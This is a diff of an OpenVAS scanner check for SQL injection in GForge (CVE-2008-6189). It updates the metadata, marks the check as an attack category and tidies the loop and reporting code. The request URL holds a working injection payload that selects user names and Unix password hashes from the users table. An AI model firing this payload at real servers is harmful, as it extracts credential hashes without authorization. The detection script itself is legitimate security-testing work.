@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: GForge_multiple_sql_injection.nasl 4970 2017-01-09 15:00:59Z teissa $
+# $Id: GForge_multiple_sql_injection.nasl 5768 2017-03-29 13:37:01Z cfi $
 #
 # GForge Multiple SQL Injection Vulnerabilities
 #
@@ -40,17 +40,16 @@ tag_solution = "Update to newer version if available at http://gforge.org/";
 if (description)
 {
  script_id(100011);
- script_version("$Revision: 4970 $");
- script_tag(name:"last_modification", value:"$Date: 2017-01-09 16:00:59 +0100 (Mon, 09 Jan 2017) $");
+ script_version("$Revision: 5768 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 15:37:01 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-03-06 13:13:19 +0100 (Fri, 06 Mar 2009)");
  script_bugtraq_id(31674);
  script_cve_id("CVE-2008-6189");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-
  script_name("GForge Multiple SQL Injection Vulnerabilities");
- script_category(ACT_GATHER_INFO);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_category(ACT_ATTACK);
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -65,23 +64,22 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
-dir = make_list(cgi_dirs()); 
- 
-foreach d (dir)
-{ 
- url = string(d, "/news/?group_id=&limit=50&offset=50;select+1+as+id,unix_pw+as+forum_id,+user_name||unix_pw+as+summary+from+users");
- req = http_get(item:url, port:port);
- buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
- if( buf == NULL )continue;
+foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) { 
 
- if( buf =~ "forum_id=\$1\$.*" )
-   {    
-    security_message(port:port);
-    exit(0);
-   }
+  if( dir == "/" ) dir = "";
+  url = string(dir, "/news/?group_id=&limit=50&offset=50;select+1+as+id,unix_pw+as+forum_id,+user_name||unix_pw+as+summary+from+users");
+
+  req = http_get(item:url, port:port);
+  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
+  if( buf == NULL )continue;
+
+  if( buf =~ "forum_id=\$1\$.*" ) {    
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
-exit(0);
+
+exit( 99 );
